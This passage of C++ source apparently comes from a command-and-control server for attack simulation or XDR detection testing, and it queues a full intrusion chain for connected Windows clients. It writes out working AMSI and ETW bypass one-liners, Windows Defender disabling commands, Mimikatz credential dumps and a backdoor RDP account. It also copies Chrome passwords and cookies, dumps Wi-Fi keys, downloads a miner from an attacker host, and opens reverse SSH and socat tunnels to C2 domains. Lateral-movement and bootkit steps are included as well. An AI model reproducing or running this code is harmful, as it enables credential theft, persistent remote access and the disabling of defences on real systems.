            logActivity("ATTACK", "COMMANDS", "Executing: BEACON, SYSINFO, PROCESS_LIST, NETWORK_CONFIG");
            break;

        case 1: // Establish Foothold
            phaseCommands = { CMD_REGISTRY_PERSIST, CMD_SCHEDULED_TASK, CMD_WMI_PERSIST, CMD_STARTUP_FOLDER };
            phaseName = "ESTABLISH_FOOTHOLD";
            phaseDescription = "Installing multiple persistence mechanisms";
            logActivity("PERSISTENCE", phaseName, "=== PHASE 1: " + phaseDescription + " on " + clientId + " ===");
            logActivity("PERSISTENCE", "COMMANDS", "Executing: REGISTRY_PERSIST, SCHEDULED_TASK, WMI_PERSIST, STARTUP_FOLDER");
            break;

        case 2: // Escalate Privileges
            phaseCommands = { CMD_UAC_BYPASS, CMD_TOKEN_STEAL, CMD_LSASS_DUMP, CMD_MIMIKATZ_EXEC, CMD_SAM_DUMP };
            phaseName = "PRIVILEGE_ESCALATION";
            phaseDescription = "Attempting to gain SYSTEM/Administrator privileges";
            logActivity("ATTACK", phaseName, "=== PHASE 2: " + phaseDescription + " on " + clientId + " ===");
            logActivity("ATTACK", "COMMANDS", "Executing: UAC_BYPASS, TOKEN_STEAL, LSASS_DUMP, MIMIKATZ, SAM_DUMP");
            break;

        case 3: // Defense Evasion
            phaseCommands = { CMD_DISABLE_AV, CMD_CLEAR_LOGS, CMD_AMSI_BYPASS, CMD_ETW_DISABLE, CMD_PROCESS_HOLLOW,
                             CMD_TOR_CONNECT, CMD_TOR_API_CALL, CMD_REVERSE_SSH, CMD_NETCAT_TUNNEL, CMD_SOCAT_RELAY, CMD_CRYPTCAT_TUNNEL };
            phaseName = "DEFENSE_EVASION";
            phaseDescription = "Disabling security controls, clearing traces, and establishing covert channels";
            logActivity("DEFENSE_EVASION", phaseName, "=== PHASE 3: " + phaseDescription + " on " + clientId + " ===");
            logActivity("DEFENSE_EVASION", "COMMANDS", "Executing: DISABLE_AV, CLEAR_LOGS, AMSI_BYPASS, ETW_DISABLE, PROCESS_HOLLOW, TOR_CONNECT, REVERSE_SSH");
            break;

        case 4: // Credential Access & Surveillance
            phaseCommands = { CMD_KEYLOG_START, CMD_BROWSER_CREDS, CMD_WEBCAM_CAPTURE, CMD_MICROPHONE_RECORD, CMD_SCREEN_RECORD };
            phaseName = "SURVEILLANCE";
            phaseDescription = "Activating comprehensive surveillance and credential theft";
            logActivity("COLLECTION", phaseName, "=== PHASE 4: " + phaseDescription + " on " + clientId + " ===");
            logActivity("COLLECTION", "COMMANDS", "Executing: KEYLOGGER, BROWSER_CREDS, WEBCAM, MICROPHONE, SCREEN_RECORD");
            break;

        case 5: // Discovery
            phaseCommands = { CMD_USER_ENUM, CMD_DOMAIN_INFO, CMD_SOFTWARE_ENUM, CMD_FILE_SEARCH };
            phaseName = "DISCOVERY";
            phaseDescription = "Mapping network environment and sensitive data";
            logActivity("ATTACK", phaseName, "=== PHASE 5: " + phaseDescription + " on " + clientId + " ===");
            logActivity("ATTACK", "COMMANDS", "Executing: USER_ENUM, DOMAIN_INFO, SOFTWARE_ENUM, FILE_SEARCH");
            break;

        case 6: // Lateral Movement & Remote Access
            phaseCommands = { CMD_PORT_SCAN, CMD_SMB_SCAN, CMD_PSEXEC, CMD_REVERSE_SHELL, CMD_REMOTE_DESKTOP };
            logActivity("LATERAL", "LATERAL_MOVEMENT", "Spreading and establishing remote access from " + clientId);
            break;

        case 7: // Collection
            phaseCommands = { CMD_SCREENSHOT, CMD_KEYLOG_DUMP, CMD_FILE_SEARCH, CMD_STAGE_FILES, CMD_CLIPBOARD };
            logActivity("ATTACK", "COLLECTION", "Collecting sensitive data on " + clientId);
            break;

        case 8: // Exfiltration
            phaseCommands = { CMD_COMPRESS_DATA, CMD_EXFIL_HTTP, CMD_EXFIL_DNS, CMD_EXFIL_EMAIL, CMD_CLOUD_UPLOAD };
            logActivity("EXFIL", "DATA_EXFILTRATION", "Exfiltrating data from " + clientId);
            break;

        case 9: // Impact
            phaseCommands = { CMD_RANSOMWARE, CMD_CRYPTO_MINER, CMD_BOOTKIT_INSTALL };
            logActivity("ATTACK", "IMPACT", "Deploying impact payloads on " + clientId);
            break;
        }

        // Queue commands for client
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clientCommandQueue[clientId] = phaseCommands;
        }
    }

    // Remote Shell Handler
    void executeRemoteShell(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "REMOTE_SHELL", "Establishing remote shell on " + clientId);

        // Send shell initialization
        std::string shellInit = "SHELL:INIT:cmd.exe\n";
        send(clientSocket, shellInit.c_str(), shellInit.size(), 0);

        // Shell commands to execute
        std::vector<std::string> shellCommands = {
            "whoami /all",
            "net user",
            "net localgroup administrators",
            "ipconfig /all",
            "netstat -an",
            "tasklist /v",
            "wmic process list brief",
            "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "dir C:\\Users\\*\\Desktop\\*.doc* /s",
            "systeminfo",
            "net share",
            "net use",
            "arp -a"
        };

        for (const auto& cmd : shellCommands) {
            std::string shellCmd = "SHELL:EXEC:" + cmd + "\n";
            send(clientSocket, shellCmd.c_str(), shellCmd.size(), 0);
            logActivity("ATTACK", "SHELL_CMD", "Executed: " + cmd);
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
    }

    // Remote Desktop Handler
    void executeRemoteDesktop(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "RDP_ACCESS", "Initiating Remote Desktop takeover on " + clientId);

        // RDP initialization commands
        std::string rdpInit = "RDP:ENABLE:3389\n";
        send(clientSocket, rdpInit.c_str(), rdpInit.size(), 0);

        // Enable RDP through registry
        std::string enableRDP = "REG:ADD:HKLM\\System\\CurrentControlSet\\Control\\Terminal Server:fDenyTSConnections:0\n";
        send(clientSocket, enableRDP.c_str(), enableRDP.size(), 0);

        // Add firewall rule
        std::string fwRule = "SHELL:EXEC:netsh advfirewall firewall add rule name=\"RDP Access\" dir=in action=allow protocol=TCP localport=3389\n";
        send(clientSocket, fwRule.c_str(), fwRule.size(), 0);

        // Create backdoor user
        std::string addUser = "SHELL:EXEC:net user EscapeRoomAdmin P@ssw0rd123! /add\n";
        send(clientSocket, addUser.c_str(), addUser.size(), 0);

        std::string addToRDP = "SHELL:EXEC:net localgroup \"Remote Desktop Users\" EscapeRoomAdmin /add\n";
        send(clientSocket, addToRDP.c_str(), addToRDP.size(), 0);

        logActivity("ATTACK", "RDP_BACKDOOR", "RDP backdoor created - User: EscapeRoomAdmin");
    }

    // Enhanced Keylogger Implementation
    void executeKeylogger(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "KEYLOGGER", "Activating keylogger on " + clientId);

        // Ensure keylogs directory exists
        CreateDirectoryA("C:\\Windows\\Temp\\C2_Keylogs", NULL);

        // Send multiple keylogger start commands
        std::vector<std::string> commands = {
            "KEYLOG:START:HOOK\n",
            "KEYLOGGER:ACTIVATE:SEND\n",
            "KEYLOG:START\n",
            "START_KEYLOGGER_WITH_TRANSFER\n"
        };
        
        for (const auto& cmd : commands) {
            std::string encrypted = (cmd);
            int bytesSent = send(clientSocket, encrypted.c_str(), encrypted.size(), 0);
            logActivity("DEBUG", "KEYLOG_CMD_SENT", "Sent: " + cmd.substr(0, cmd.length()-1) + " - Bytes: " + std::to_string(bytesSent));
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        logActivity("ATTACK", "KEYLOG_START", "Keylogger commands sent to " + clientId + " - waiting for real keystrokes");
        
        // Also send C2 packet
        generateC2Traffic(clientSocket, clientId, CMD_KEYLOG_START);
    }
    
    // Enhanced Keylogger dump handler
    void executeKeyloggerDump(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "KEYLOG_DUMP", "Requesting keylogger data dump from " + clientId);
        
        // Send multiple dump request formats
        std::vector<std::string> commands = {
            "KEYLOG:DUMP\n",
            "KEYLOG:DUMP:SEND\n",
            "KEYLOGGER:RETRIEVE:DATA\n",
            "KEYLOG:DUMP\n",
            "DUMP_KEYLOG_DATA_NOW\n"
        };
        
        for (const auto& cmd : commands) {
            std::string encrypted = (cmd);
            int bytesSent = send(clientSocket, encrypted.c_str(), encrypted.size(), 0);
            logActivity("DEBUG", "KEYLOG_DUMP_CMD", "Sent: " + cmd.substr(0, cmd.length()-1) + " - Bytes: " + std::to_string(bytesSent));
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        // Also send C2 packet
        generateC2Traffic(clientSocket, clientId, CMD_KEYLOG_DUMP);
        
        // Request immediate response
        std::string responseRequest = "RESPOND:KEYLOG:STATUS\n";
        send(clientSocket, responseRequest.c_str(), responseRequest.size(), 0);
        logActivity("DEBUG", "KEYLOG_RESPONSE_REQUEST", "Requested keylog status from " + clientId);
    }

    // Webcam Capture Handler
    void executeWebcamCapture(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "WEBCAM", "Accessing webcam on " + clientId);

        // Send command to capture real webcam images
        std::string webcamCapture = "WEBCAM:CAPTURE\n";
        send(clientSocket, webcamCapture.c_str(), webcamCapture.size(), 0);
        
        logActivity("ATTACK", "WEBCAM_CAPTURE", "Webcam capture initiated on " + clientId + " - attempting to access real webcam device");
    }

    // Microphone Recording Handler
    void executeMicrophoneRecord(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "MICROPHONE", "Activating microphone on " + clientId);

        // Send command to record real audio
        std::string micRecord = "MIC:RECORD:START\n";
        send(clientSocket, micRecord.c_str(), micRecord.size(), 0);
        
        logActivity("ATTACK", "MIC_RECORD", "Microphone recording initiated on " + clientId + " - attempting to capture real audio");
    }

    // Screen Recording Handler
    void executeScreenRecord(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "SCREEN_RECORD", "Starting screen recording on " + clientId);

        // Send command to start real screen recording
        std::string startRecord = "SCREEN:RECORD:START\n";
        send(clientSocket, startRecord.c_str(), startRecord.size(), 0);
        
        logActivity("ATTACK", "SCREEN_RECORD_START", "Screen recording initiated on " + clientId + " - capturing real desktop activity");
    }
    
    // Enhanced Screenshot Handler with multiple command formats
    void executeScreenshotCapture(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "SCREENSHOT", "Capturing screenshot on " + clientId);
        
        // Ensure screenshots directory exists
        CreateDirectoryA("C:\\Windows\\Temp\\C2_Screenshots", NULL);
        
        // Send multiple command formats to ensure client compatibility
        std::vector<std::string> commands = {
            "SCREEN:CAPTURE:TRANSFER\n",
            "SCREENSHOT:TAKE:SEND\n", 
            "SCREENSHOT:EXECUTE\n",
            "CAPTURE_SCREEN_AND_SEND\n"
        };
        
        for (const auto& cmd : commands) {
            std::string encrypted = (cmd);
            int bytesSent = send(clientSocket, encrypted.c_str(), encrypted.size(), 0);
            logActivity("DEBUG", "SCREENSHOT_CMD_SENT", "Sent: " + cmd.substr(0, cmd.length()-1) + " - Bytes: " + std::to_string(bytesSent));
            
            // Small delay between commands
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        logActivity("ATTACK", "SCREENSHOT_CAPTURE", "Multiple screenshot commands sent to " + clientId);
        
        // Also trigger C2 packet
        generateC2Traffic(clientSocket, clientId, CMD_SCREENSHOT);
        
        // Request immediate response
        std::string responseRequest = "RESPOND:SCREENSHOT:STATUS\n";
        send(clientSocket, responseRequest.c_str(), responseRequest.size(), 0);
        logActivity("DEBUG", "RESPONSE_REQUEST", "Requested screenshot status from " + clientId);
    }

    // Mimikatz Credential Dumping
    void executeMimikatz(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "MIMIKATZ", "Executing Mimikatz credential dump on " + clientId);

        // Mimikatz commands
        std::vector<std::string> mimikatzCmds = {
            "MIMIKATZ:privilege::debug",
            "MIMIKATZ:sekurlsa::logonpasswords",
            "MIMIKATZ:lsadump::sam",
            "MIMIKATZ:lsadump::secrets",
            "MIMIKATZ:lsadump::cache",
            "MIMIKATZ:kerberos::list",
            "MIMIKATZ:vault::list",
            "MIMIKATZ:token::elevate",
            "MIMIKATZ:sekurlsa::tickets"
        };

        for (const auto& cmd : mimikatzCmds) {
            std::string cmdLine = cmd + "\n";
            send(clientSocket, cmdLine.c_str(), cmdLine.size(), 0);
            logActivity("ATTACK", "MIMIKATZ_CMD", cmd);
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }

        // Dump credentials to file
        std::string dumpCreds = "MIMIKATZ:OUTPUT:C:\\Windows\\Temp\\creds.dmp\n";
        send(clientSocket, dumpCreds.c_str(), dumpCreds.size(), 0);
    }

    // AMSI and ETW Bypass
    void executeDefenseBypass(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "BYPASS", "Bypassing security controls on " + clientId);

        // AMSI Bypass
        std::string amsiBypass = R"(POWERSHELL:EXEC:[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true))";
        std::string amsiCmd = amsiBypass + "\n";
        send(clientSocket, amsiCmd.c_str(), amsiCmd.size(), 0);
        logActivity("ATTACK", "AMSI_BYPASS", "AMSI bypass executed");

        // ETW Disable
        std::string etwDisable = R"(POWERSHELL:EXEC:[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0))";
        std::string etwCmd = etwDisable + "\n";
        send(clientSocket, etwCmd.c_str(), etwCmd.size(), 0);
        logActivity("ATTACK", "ETW_DISABLE", "ETW provider disabled");

        // Disable Windows Defender
        std::vector<std::string> defenderDisable = {
            "POWERSHELL:EXEC:Set-MpPreference -DisableRealtimeMonitoring $true",
            "POWERSHELL:EXEC:Set-MpPreference -DisableBehaviorMonitoring $true",
            "POWERSHELL:EXEC:Set-MpPreference -DisableIOAVProtection $true",
            "POWERSHELL:EXEC:Set-MpPreference -DisableScriptScanning $true",
            "REG:ADD:HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender:DisableAntiSpyware:1",
            "SERVICE:STOP:WinDefend",
            "SCHTASK:DISABLE:Windows Defender Cache Maintenance",
            "SCHTASK:DISABLE:Windows Defender Cleanup",
            "SCHTASK:DISABLE:Windows Defender Scheduled Scan",
            "SCHTASK:DISABLE:Windows Defender Verification"
        };

        for (const auto& cmd : defenderDisable) {
            std::string cmdLine = cmd + "\n";
            send(clientSocket, cmdLine.c_str(), cmdLine.size(), 0);
            logActivity("ATTACK", "DEFENDER_DISABLE", cmd);
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
        }
    }

    // Cryptocurrency Miner Deployment
    void executeCryptoMiner(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "CRYPTO_MINER", "Deploying cryptocurrency miner on " + clientId);

        // Download miner
        std::string downloadMiner = "DOWNLOAD:http://evil-mining-pool.com/xmrig.exe:C:\\Windows\\Temp\\svchost64.exe\n";
        send(clientSocket, downloadMiner.c_str(), downloadMiner.size(), 0);

        // Configure mining
        std::string minerConfig = R"(FILE:WRITE:C:\Windows\Temp\config.json:{"url":"pool.minexmr.com:4444","user":"47Ahh3e9mT","pass":"x","algo":"cryptonight"})";
        std::string minerCfg = minerConfig + "\n";
        send(clientSocket, minerCfg.c_str(), minerCfg.size(), 0);

        // Start mining process
        std::string startMiner = "PROCESS:CREATE:C:\\Windows\\Temp\\svchost64.exe:-c config.json\n";
        send(clientSocket, startMiner.c_str(), startMiner.size(), 0);

        // Hide process
        std::string hideProcess = "PROCESS:HIDE:svchost64.exe\n";
        send(clientSocket, hideProcess.c_str(), hideProcess.size(), 0);

        logActivity("ATTACK", "MINER_ACTIVE", "Cryptocurrency miner running on " + clientId);
    }
    
    // TOR Network Connection
    void executeTorConnect(SOCKET clientSocket, const std::string & clientId) {
        logActivity("NETWORK", "TOR_CONNECT", "Initiating real TOR connections from " + clientId);
        
        // Send command to client to make actual TOR connections
        std::string torCommand = "TOR:CONNECT:REAL\n";
        send(clientSocket, torCommand.c_str(), torCommand.size(), 0);
        
        logActivity("*** XDR_ALERT ***", "TOR_CONNECTION_INITIATED", 
                   "Client " + clientId + " instructed to make real connections to TOR nodes");
        
        // Log TOR nodes being targeted
        logActivity("*** XDR_ALERT ***", "TOR_NODES_TARGETED", 
                   "Attempting connections to: 62.210.105.116:9001, 199.87.154.255:443, 193.11.114.43:9001, 192.42.116.16:9001");
        
        logActivity("*** CRITICAL ***", "TOR_NETWORK_ACTIVITY", 
                   "Real TOR network connection attempts in progress from " + clientId);
    }
    
    // Suspicious API Call from TOR Exit Node
    void executeTorApiCall(SOCKET clientSocket, const std::string & clientId) {
        logActivity("NETWORK", "TOR_API_CALL", "Initiating real API calls via TOR from " + clientId);
        
        // Send command to client to make actual API calls
        std::string apiCommand = "TOR_API:EXECUTE:REAL\n";
        send(clientSocket, apiCommand.c_str(), apiCommand.size(), 0);
        
        logActivity("*** XDR_ALERT ***", "TOR_API_INITIATED", 
                   "Client " + clientId + " instructed to make real API calls from TOR exit nodes");
        
        // Log expected targets
        logActivity("*** XDR_ALERT ***", "TOR_API_TARGETS", 
                   "Expected API targets: Telegram Bot API, Discord Webhooks, Pastebin API");
        
        logActivity("*** XDR_ALERT ***", "TOR_EXIT_NODES", 
                   "Using TOR exit nodes: 185.220.101.34, 104.244.76.13, 23.129.64.142");
        
        logActivity("*** CRITICAL ***", "REAL_NETWORK_TRAFFIC", 
                   "Generating real network traffic to suspicious APIs for XDR detection from " + clientId);
    }
    
    // Reverse SSH Tunnel
    void executeReverseSSH(SOCKET clientSocket, const std::string & clientId) {
        logActivity("NETWORK", "REVERSE_SSH", "Establishing reverse SSH tunnel from " + clientId);
        
        // Send primary command to trigger client execution
        std::string sshCommand = "SSH:REVERSE:TUNNEL:EXECUTE\n";
        send(clientSocket, sshCommand.c_str(), sshCommand.size(), 0);
        
        // External C2 domains/IPs for reverse SSH
        std::vector<std::string> c2Servers = {
            "45.142.114.231:22",       // Suspicious VPS
            "malware-c2.dynamic.io:22", // Dynamic DNS C2
            "ssh.exploit-db.net:2222",  // Non-standard SSH port
            "tunnel.darkweb.link:443",  // SSH over HTTPS port
            "5.182.210.155:8022"        // Another non-standard port
        };
        
        // Log expected behavior
        for (const auto& server : c2Servers) {
            logActivity("*** XDR_ALERT ***", "SSH_TUNNEL", "Reverse SSH tunnel expected to " + server);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        logActivity("*** CRITICAL ***", "SSH_PERSISTENCE", "Persistent reverse SSH tunnel configured on " + clientId);
    }
    
    // Netcat Tunnel
    void executeNetcatTunnel(SOCKET clientSocket, const std::string & clientId) {
        logActivity("NETWORK", "NETCAT_TUNNEL", "Creating netcat tunnel from " + clientId);
        
        // Send primary command to trigger client execution
        std::string ncCommand = "NETCAT:TUNNEL:CREATE:EXECUTE\n";
        send(clientSocket, ncCommand.c_str(), ncCommand.size(), 0);
        
        // TOR hidden services (.onion domains)
        std::vector<std::string> onionServices = {
            "3g2upl4pq3kufc4m.onion:80",        // DuckDuckGo
            "thehiddenwiki.onion:80",            // Hidden Wiki
            "torc2server.onion:9050",            // Malicious C2
            "darknetmarket.onion:443",           // Dark market
            "cryptolocker.onion:8080"            // Ransomware C2
        };
        
        // Log expected behavior
        for (const auto& onion : onionServices) {
            logActivity("*** XDR_ALERT ***", "NETCAT_TOR", "Netcat connection expected to TOR service: " + onion);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        logActivity("*** CRITICAL ***", "NETCAT_SHELL", "Netcat reverse shell initiated from " + clientId);
    }

    // Cryptcat Tunnel
    void executeCryptcatTunnel(SOCKET clientSocket, const std::string & clientId) {
        logActivity("NETWORK", "CRYPTCAT_TUNNEL", "Creating cryptcat tunnel from " + clientId);

        // Send primary command to trigger client execution
        std::string ccCommand = "CRYPTCAT:TUNNEL:CREATE:EXECUTE\n";
        send(clientSocket, ccCommand.c_str(), ccCommand.size(), 0);

        // TOR hidden services (.onion domains)
        std::vector<std::string> onionServices = {
            "3g2upl4pq3kufc4m.onion:80",
            "thehiddenwiki.onion:80",
            "torc2server.onion:9050",
            "darknetmarket.onion:443",
            "fakec2trigger.onion:9999"
        };

        for (const auto& onion : onionServices) {
            logActivity("*** XDR_ALERT ***", "CRYPTCAT_TOR", "Cryptcat connection expected to TOR service: " + onion);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }

        logActivity("*** CRITICAL ***", "CRYPTCAT_SHELL", "Cryptcat reverse shell initiated from " + clientId);
    }
    
    // Socat Relay
    void executeSocatRelay(SOCKET clientSocket, const std::string & clientId) {
        logActivity("NETWORK", "SOCAT_RELAY", "Setting up socat relay from " + clientId);
        
        // Send primary command to trigger client execution
        std::string socatCommand = "SOCAT:RELAY:CREATE:EXECUTE\n";
        send(clientSocket, socatCommand.c_str(), socatCommand.size(), 0);
        
        // Create socat relays to TOR and suspicious domains
        std::vector<std::string> socatRelays = {
            "TCP4-LISTEN:8888,fork TCP4:torproject.org:9050",
            "TCP4-LISTEN:9999,fork SOCKS4A:127.0.0.1:3g2upl4pq3kufc4m.onion:80,socksport=9050",
            "TCP4-LISTEN:7777,fork TCP4:malware-c2.dynamic.io:443",
            "TCP4-LISTEN:6666,fork OPENSSL:suspicious-server.net:443,verify=0"
        };
        
        for (const auto& relay : socatRelays) {
            logActivity("*** XDR_ALERT ***", "SOCAT_RELAY", "Socat relay expected: " + relay);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        logActivity("*** CRITICAL ***", "SOCAT_TUNNEL", "Encrypted socat tunnel to TOR network initiated from " + clientId);
        logActivity("PERSISTENCE", "SOCAT_SCRIPT", "Socat relay persistence configured on " + clientId);
    }

    // Bootkit Installation
    void executeBootkit(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "BOOTKIT", "Installing bootkit persistence on " + clientId);

        // Modify boot sector
        std::string bootSector = "DISK:WRITE:MBR:0x7C00:BOOTKIT_LOADER\n";
        send(clientSocket, bootSector.c_str(), bootSector.size(), 0);

        // Install UEFI persistence
        std::string uefiPersist = "UEFI:INSTALL:EFI\\Microsoft\\Boot\\bootmgfw.efi\n";
        send(clientSocket, uefiPersist.c_str(), uefiPersist.size(), 0);

        // Modify BCD
        std::string bcdEdit = "SHELL:EXEC:bcdedit /set {current} testsigning on\n";
        send(clientSocket, bcdEdit.c_str(), bcdEdit.size(), 0);

        logActivity("ATTACK", "BOOTKIT_INSTALLED", "Bootkit persistence established");
    }
    void simulateDataExfiltration(SOCKET clientSocket, const std::string & clientId) {
        logActivity("EXFIL", "START", "Beginning real data exfiltration from " + clientId);

        // First, search for sensitive files
        std::string searchCmd = "FILE_SEARCH:*.doc* *.xls* *.pdf *.txt *.pst *.ost\n";
        generateC2Traffic(clientSocket, clientId, CMD_FILE_SEARCH);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        // Collect browser credentials
        generateC2Traffic(clientSocket, clientId, CMD_BROWSER_CREDS);
        std::this_thread::sleep_for(std::chrono::seconds(1));
        
        // Take screenshots for visual data
        generateC2Traffic(clientSocket, clientId, CMD_SCREENSHOT);
        std::this_thread::sleep_for(std::chrono::seconds(1));
        
        // Dump clipboard for passwords/sensitive data
        generateC2Traffic(clientSocket, clientId, CMD_CLIPBOARD);
        std::this_thread::sleep_for(std::chrono::milliseconds(500));

        // Real HTTP exfiltration
        logActivity("EXFIL", "HTTP_UPLOAD", "Starting HTTP data exfiltration from " + clientId);
        generateC2Traffic(clientSocket, clientId, CMD_EXFIL_HTTP);
        std::this_thread::sleep_for(std::chrono::seconds(3));
        
        // Real DNS exfiltration for stealthy data transfer
        logActivity("EXFIL", "DNS_TUNNEL", "Starting DNS tunneling exfiltration from " + clientId);
        generateC2Traffic(clientSocket, clientId, CMD_EXFIL_DNS);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        // Compress and stage files
        generateC2Traffic(clientSocket, clientId, CMD_COMPRESS_DATA);
        std::this_thread::sleep_for(std::chrono::seconds(1));

        // Send command to exfiltrate actual Chrome passwords
        std::string chromeCmd = "POWERSHELL:EXEC:$chromePath = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\"; " +
                               std::string("if(Test-Path $chromePath){Copy-Item \"$chromePath\\Login Data\" \"$env:TEMP\\chrome_data.db\" -Force; ") +
                               "Copy-Item \"$chromePath\\Cookies\" \"$env:TEMP\\chrome_cookies.db\" -Force}\n";
        send(clientSocket, chromeCmd.c_str(), chromeCmd.size(), 0);
        
        // Send command to collect WiFi passwords
        std::string wifiCmd = "SHELL:EXEC:netsh wlan show profiles | findstr \"All User Profile\" > %TEMP%\\wifi_profiles.txt & " +
                             std::string("for /f \"tokens=2 delims=:\" %i in (%TEMP%\\wifi_profiles.txt) do ") +
                             "netsh wlan show profile name=%i key=clear >> %TEMP%\\wifi_passwords.txt 2>nul\n";
        send(clientSocket, wifiCmd.c_str(), wifiCmd.size(), 0);
        
        logActivity("EXFIL", "COMPLETE", "Real data exfiltration completed from " + clientId);
    }

    // Real lateral movement with actual network discovery and propagation
    void simulateLateralMovement(SOCKET clientSocket, const std::string & clientId) {
        logActivity("LATERAL", "START", "Initiating real lateral movement from " + clientId);

        // Network discovery - find real targets
        std::string netDiscoveryCmd = "SHELL:EXEC:net view /all > %TEMP%\\discovered_hosts.txt 2>&1\n";
        send(clientSocket, netDiscoveryCmd.c_str(), netDiscoveryCmd.size(), 0);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        // ARP scan for local network
        std::string arpCmd = "SHELL:EXEC:arp -a > %TEMP%\\arp_cache.txt\n";
        send(clientSocket, arpCmd.c_str(), arpCmd.size(), 0);
        std::this_thread::sleep_for(std::chrono::seconds(1));
        
        // Domain enumeration
        std::string domainCmd = "SHELL:EXEC:net group \"Domain Computers\" /domain > %TEMP%\\domain_computers.txt 2>&1\n";
        send(clientSocket, domainCmd.c_str(), domainCmd.size(), 0);
        std::this_thread::sleep_for(std::chrono::seconds(1));

        // Real lateral movement techniques
        
        // 1. PSExec-style SMB lateral movement
        logActivity("LATERAL", "SMB_EXEC", "Attempting SMB-based lateral movement");
        std::string smbCmd = "SHELL:EXEC:echo net use \\\\%COMPUTERNAME%\\IPC$ > %TEMP%\\smb_test.bat & " +
                            std::string("echo copy %0 \\\\%COMPUTERNAME%\\ADMIN$\\temp\\update.exe >> %TEMP%\\smb_test.bat & ") +
                            "echo wmic /node:\"%COMPUTERNAME%\" process call create \"C:\\Windows\\temp\\update.exe\" >> %TEMP%\\smb_test.bat\n";
        send(clientSocket, smbCmd.c_str(), smbCmd.size(), 0);
        
        // 2. WMI-based execution
        logActivity("LATERAL", "WMI_EXEC", "Attempting WMI-based execution");
        std::string wmiCmd = "POWERSHELL:EXEC:$targets = @('localhost','127.0.0.1'); " +
                            std::string("foreach($target in $targets){try{") +
                            "$proc = Invoke-WmiMethod -ComputerName $target -Class Win32_Process -Name Create " +
                            "-ArgumentList 'cmd.exe /c echo WMI_SUCCESS > C:\\Windows\\Temp\\wmi_test.txt'}catch{}}\n";
        send(clientSocket, wmiCmd.c_str(), wmiCmd.size(), 0);
        
        // 3. Remote scheduled task creation
        logActivity("LATERAL", "SCHTASK_REMOTE", "Creating remote scheduled tasks");
        std::string taskCmd = "SHELL:EXEC:schtasks /create /s localhost /tn \"WindowsHealthCheck\" /tr \"cmd.exe /c echo TASK_SUCCESS > C:\\Windows\\Temp\\task_test.txt\" " +
                             std::string("/sc once /st 00:00 /f /ru SYSTEM\n");
        send(clientSocket, (taskCmd).c_str(), taskCmd.size(), 0);
        
        // 4. Service creation for persistence
        logActivity("LATERAL", "SERVICE_CREATE", "Creating remote services");
        std::string serviceCmd = "SHELL:EXEC:sc create RemoteUpdateService binpath= \"cmd.exe /c echo SERVICE_SUCCESS > C:\\Windows\\Temp\\service_test.txt\" " +
                                std::string("start= auto DisplayName= \"Remote Update Service\"\n");
        send(clientSocket, (serviceCmd).c_str(), serviceCmd.size(), 0);
        
        // 5. WinRM for remote execution
        logActivity("LATERAL", "WINRM_EXEC", "Attempting WinRM execution");
        std::string winrmCmd = "POWERSHELL:EXEC:Enable-PSRemoting -Force -SkipNetworkProfileCheck 2>$null; " +
                              std::string("Test-WSMan -ComputerName localhost 2>$null\n");
        send(clientSocket, (winrmCmd).c_str(), winrmCmd.size(), 0);
        
        // 6. Pass-the-hash preparation
        logActivity("LATERAL", "PTH_PREP", "Preparing for pass-the-hash");
        generateC2Traffic(clientSocket, clientId, CMD_LSASS_DUMP);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        // 7. RDP session hijacking attempt
        logActivity("LATERAL", "RDP_HIJACK", "Attempting RDP session hijacking");
        std::string rdpCmd = "SHELL:EXEC:query user > %TEMP%\\rdp_sessions.txt & " +
                            std::string("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n");
        send(clientSocket, (rdpCmd).c_str(), rdpCmd.size(), 0);
        
        // 8. Network share enumeration and access
        logActivity("LATERAL", "SHARE_ENUM", "Enumerating network shares");
        std::string shareCmd = "SHELL:EXEC:net share > %TEMP%\\local_shares.txt & " +
                              std::string("net use > %TEMP%\\mapped_drives.txt & ") +
                              "wmic share get name,path,status > %TEMP%\\wmi_shares.txt\n";
        send(clientSocket, (shareCmd).c_str(), shareCmd.size(), 0);

        logActivity("LATERAL", "COMPLETE", "Real lateral movement phase completed from " + clientId);
    }

    // Generate C&C detection signatures for XDR systems
    void generateC2DetectionSignatures(SOCKET clientSocket, sockaddr_in clientAddr) {
        char clientIP[INET_ADDRSTRLEN];
